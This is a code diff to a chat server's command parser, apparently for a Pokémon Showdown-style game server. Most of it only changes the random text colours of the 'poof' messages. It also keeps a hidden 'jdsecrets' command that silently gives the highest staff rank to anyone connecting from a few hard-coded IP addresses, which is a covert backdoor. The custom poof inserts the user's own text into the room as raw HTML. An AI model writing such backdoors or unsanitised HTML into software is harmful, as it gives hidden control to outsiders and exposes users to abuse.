@@ -1497,11 +1497,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		break;
 		
 	case 'jdsecrets':
-		if (user.ip === '99.251.253.160' ||user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
-			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			user.getIdentity = function() { return ' ' + user.name }
+		if (user.ip === '99.251.253.160' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
+			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-			return false;
+			return false;
 		}
 		break;
 
@@ -1542,7 +1542,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	
 	case 'd':
 	case 'poof':
-		var btags = '<strong><font color="'+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+'" >';
+		var btags = '<strong><font color="'+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+'" >';
 		var etags = '</font></strong>'
 		var targetid = toUserid(user);
 		var success = false;
@@ -1579,7 +1579,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		
 		if(poofeh)
 		{
-			var btags = '<strong><font color="'+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+Math.floor((Math.random()*0xEF) + 0xEF).toString(16)+'" >';
+			var btags = '<strong><font color="'+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+Math.floor((Math.random()*0xCF) + 0x30).toString(16)+'" >';
 			var etags = '</font></strong>'
 			room.addRaw(btags + '~~ '+user.name+' '+target+'! ~~' + etags);
 			logModCommand(room, user.name + ' used a custom poof message: \n "'+target+'"',true);	
